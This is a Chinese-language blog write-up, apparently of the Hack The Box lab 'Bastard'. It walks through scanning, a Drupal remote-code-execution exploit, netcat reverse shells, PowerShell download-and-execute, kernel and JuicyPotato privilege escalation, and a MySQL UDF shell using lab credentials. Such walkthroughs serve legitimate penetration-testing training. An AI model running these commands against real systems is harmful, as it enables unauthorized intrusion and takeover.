@@ -1,0 +1,869 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <link rel="icon" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FYHypo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="从ping结果的ttl&#x3D;127也能看出是windows机器  0x01 端口扫描12nmap -sT --min-rate 10000 -p- 10.129.22.66 -oA nmapscan&#x2F;portsnmap -sU --top-ports 20 10.129.22.66 -oA nmapscan&#x2F;udp     http、rpc、未知  12nmap -sT -sC -sV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Bastard">
+<meta property="og:url" content="https://fyhypo.github.io/blog/HTB/HTB%20Bastard/index.html">
+<meta property="og:site_name" content="FYHypo&#39;s blog">
+<meta property="og:description" content="从ping结果的ttl&#x3D;127也能看出是windows机器  0x01 端口扫描12nmap -sT --min-rate 10000 -p- 10.129.22.66 -oA nmapscan&#x2F;portsnmap -sU --top-ports 20 10.129.22.66 -oA nmapscan&#x2F;udp     http、rpc、未知  12nmap -sT -sC -sV">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fyhypo.github.io/img/Bastard.jpg">
+<meta property="article:published_time" content="2024-08-31T14:30:16.480Z">
+<meta property="article:modified_time" content="2024-08-31T14:30:16.480Z">
+<meta property="article:author" content="FYHypo">
+<meta property="article:tag" content="pentest">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fyhypo.github.io/img/Bastard.jpg">
+  
+  
+  
+  <title>HTB Bastard - FYHypo&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fyhypo.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FYHypo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/none.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Bastard"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-31 22:30" pubdate>
+          2024年8月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Bastard</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111047.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>从ping结果的ttl&#x3D;127也能看出是windows机器</p>
+</blockquote>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT --min-rate 10000 -p- 10.129.22.66 -oA nmapscan/ports<br>nmap -sU --top-ports 20 10.129.22.66 -oA nmapscan/udp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810110955.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111014.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>http、rpc、未知</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sC -sV -O -p80,135,49154 10.129.22.66 -oA nmapscan/detail<br>nmap --script=vuln -p80,135,49154 10.129.22.66 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111717.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>两个rpc、一个drupal的iis7.5 web服务</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810121818.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111621.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>Drupal的默认页</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810112455.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810112536.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>drupal7.5，寻找nday</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#去掉msf和拒绝服务的结果</span><br>searchsploit drupal --exclude=<span class="hljs-string">&quot;(Metasploit)|Denial of Service&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113035.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>Drupal</strong>：</p>
+<ol>
+<li>Drupal 7.x Module Services - Remote Code Execution，通过注入可以写shell、拿管理员cookie、密码哈希；</li>
+<li>Drupalgeddon 是存在于Drupal 7版本的CVE-2014-3704，可RCE，在2014年10.15出现补丁；</li>
+<li>Drupalgeddon2 也被称为CVE-2018-7600，是在Drupal 7和Drupal 8版本中发现的⼀个远程执⾏代码漏洞；</li>
+<li>Drupalgeddon3，也被称为CVE-2019-6340， 是在Drupal 8版本中发现的另⼀个远程执⾏代码漏洞。</li>
+</ol>
+<blockquote>
+<p>该靶机发布于2017年，上述的2大概率不成，3、4可以确定有，但为了学习预期解还是从1下手</p>
+</blockquote>
+<blockquote>
+<p>考虑到利用条件等原因，按如下顺序测试：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113339.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>vim先看41564：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113505.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>根据靶机对初始信息修改</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113824.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810120545.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>再次查看初始信息设置，大概率是endpoint路径非默认，需要修改</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810120937.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>exp中给了出处blog，作者也说需要知道endpoint的路径</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810114717.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810121127.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>个人感觉可以理解为有rest风格的rpc</p>
+</blockquote>
+<p>目录爆破找endpoint路径，字典选择针对restful的endpoints的字典：</p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810122306.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;api&#x2F;api-endpoints-res.txt</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810160259.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://10.129.246.12/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -t 50 -e -s 200<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810160535.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>成功rce，接着用smb的nc拿反弹Shell：</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">smbserver.py share .<br>\\\\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810161901.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;(New-Object System.<span class="hljs-built_in">Net</span>.WebClient).Downloadfile(&#x27;http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">8000</span>/winpeas.exe&#x27;,&#x27;winpeas.exe&#x27;)&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810174543.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>winpeas全版本莫名卡住，无法进行，换msf的multi&#x2F;recon&#x2F;local_exploit_suggester：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810191410.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>保存到result后提取模块名到kernel</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> result | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | grep <span class="hljs-string">&#x27;^exploit/&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; kernel<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810192214.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810200301.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>不知道为什么每个利用都成功了但都没有创建会话</p>
+</blockquote>
+<h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p>接着换 windows-exploit-suggester ：</p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811161115.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>ms13-005、ms11-011、ms10-073、ms10-059、ms10-047</p>
+</blockquote>
+<p>利用到ms10-059时：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\MS10-<span class="hljs-number">059</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">4445</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811170631.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>ms10-059成功，其余均失败</p>
+</blockquote>
+<h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p>换sherlock：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.16.2:8000/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811161813.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>ms10-092、ms15-051、ms16-032</p>
+</blockquote>
+<p>利用到ms15-051时：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ms15-<span class="hljs-number">051</span>_x64.exe whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811172412.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>只有ms15-051利用成功</p>
+</blockquote>
+<blockquote>
+<p>除此以外，exploit-db打不开的问题待解决！</p>
+</blockquote>
+<h3 id="cve-2018-8120"><a href="#cve-2018-8120" class="headerlink" title="cve-2018-8120"></a>cve-2018-8120</h3><blockquote>
+<p>手工拿操作系统版本搜索</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811174636.png" srcset="/img/loading.gif" lazyload><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811174650.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811175106.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>只有CVE-2010-0020利用成功</p>
+</blockquote>
+<h3 id="juicy-potato"><a href="#juicy-potato" class="headerlink" title="juicy potato"></a>juicy potato</h3><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811181038.png" srcset="/img/loading.gif" lazyload></p>
+<p>开启了SeImpersonatePrivilege权限，应当引起重视</p>
+<blockquote>
+<p>首先想到令牌窃取，但缺少SeDebugPrivilege无法完成；<br>接着想到printspoofer，但版本太低对不上；<br>最后考虑到版本很低，选择juicy potato</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811182007.png" srcset="/img/loading.gif" lazyload></p>
+<p>大概率可用，<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p>
+<blockquote>
+<p>必要的CLSID可查 <a target="_blank" rel="noopener" href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/</a><br>选择 {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811182605.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用前面起的smb中的cmd反弹shell：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">JuicyPotato.exe -l <span class="hljs-number">1337</span> -p c:\Windows\System32\<span class="hljs-built_in">cmd</span>.exe -t * -c &#123;<span class="hljs-number">9</span>B1F122C-<span class="hljs-number">2982</span>-<span class="hljs-number">4</span>e91-AA8B-E071D54F2A4D&#125; -a &quot;/c \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span>&quot;<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811183141.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>成功提权</p>
+</blockquote>
+<h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><blockquote>
+<p>drupal这类cms必有数据库(mysql)，在default&#x2F;connect.php配置文件偷到凭据</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201037.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201125.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>root身份，可以尝试udf</p>
+</blockquote>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">root<br>mysql123!root<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811200212.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>即使是msf或nishang的终端仍然交互性不够，索性将3306转发到本地：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel server -p 9595 -reverse<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">chisel.exe client <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">9595</span> R:<span class="hljs-number">3306</span>:localhost:<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201339.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>验证可用性：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201713.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>版本正确、插件路径得到、利用权限正确</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201939.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">locate mysqludf<br><span class="hljs-comment">#/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;\\\\10.10.16.6\\share\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&quot;;<br><br>create function sys_exec returns string soname &#x27;udf.dll&#x27;;<br><br>select sys_exec(&#x27;\\\\10.10.16.6\\share\\nc.exe -e cmd.exe 10.10.16.6 9999&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811203148.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>除此以外，dll可用不用远程导入，直接hex后给到mysql的unhex导入就行</p>
+</blockquote>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="内核提权枚举"><a href="#内核提权枚举" class="headerlink" title="内核提权枚举"></a>内核提权枚举</h3><p>1、打靶机优先考虑sherlock.ps1</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;IEX(New-Object <span class="hljs-built_in">Net</span>.WebClient).downloadString(&#x27;http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">8000</span>/Sherlock.ps1&#x27;)&quot;<br></code></pre></td></tr></table></figure>
+
+<p>2、其次考虑windows-exploit-suggester</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/kali/PE/wes<br>python2 windows-exploit-suggester.py --database 2024-08-10-mssb.xls  --systeminfo ../../vulnhub/systeminfo.txt<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>systeminfo.txt为copy靶机systeminfo信息</p>
+</blockquote>
+<p>3、可以使用MSF的multi&#x2F;recon&#x2F;local_exploit_suggester</p>
+<blockquote>
+<p>注意有些exp需要set target 1这样设置x64&#x2F;x86</p>
+</blockquote>
+<p>4、使用winpeas，需要尝试各种版本的，好多时候exe会跑不起来、bat卡住</p>
+<p>5、wes-ng，windows-exploit-suggester的提升版，内核向量枚举特别全，需要手动<code>筛选提权+可用</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python wes.py systeminfo.txt -i <span class="hljs-string">&quot;Elevation of Privilege&quot;</span> -e<br></code></pre></td></tr></table></figure>
+
+<p>6、Powerless.bat这个脚本也值得一看，虽然无内核提权，但其余很全</p>
+<h3 id="exp库"><a href="#exp库" class="headerlink" title="exp库"></a>exp库</h3><p><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/">Windows - Privilege Escalation - Internal All The Things (swisskyrepo.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Al1ex/WindowsElevation">Al1ex&#x2F;WindowsElevation: Windows Elevation(持续更新) (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/safesword/WindowsExp/tree/master">safesword&#x2F;WindowsExp: Windows全版本提权脚本 (github.com)</a></p>
+<blockquote>
+<p>除此以外，exploit-db打不开的问题还是没解决 :(</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
